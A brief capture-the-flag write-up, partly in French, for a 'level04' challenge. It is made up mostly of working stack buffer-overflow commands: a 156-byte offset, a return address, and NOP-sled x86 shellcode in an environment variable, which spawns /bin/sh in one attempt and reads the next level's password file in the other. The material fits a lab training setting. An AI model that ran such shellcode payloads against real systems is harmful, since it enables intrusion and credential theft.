### step 1: Decompile with Ghidra

We get the c source code of the program  

### step 2: Code analysis

important !!
On passe gdb en mode follow-child avec la commande set follow-fork-mode child

segfault au 156ème char

( python -c 'print("A" * 156 + "\xae\xde\xff\xff")' ; cat ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level04
=> fonctionne pas car passage au processus parent. Même si un shell est lanc on n'y accède pas car le fork nous entraine sur le processsus parent

D'habitude on utilise le shellcode pour lancer un bash,

La on utilise un shellcode pour cat un fichier 
DB de shell codes : https://shell-storm.org/shellcode/index.html

le shellcode : https://shell-storm.org/shellcode/files/shellcode-73.html


( python -c 'print("A" * 156 + "\xae\xde\xff\xff")' ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 +  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass")') ./level04



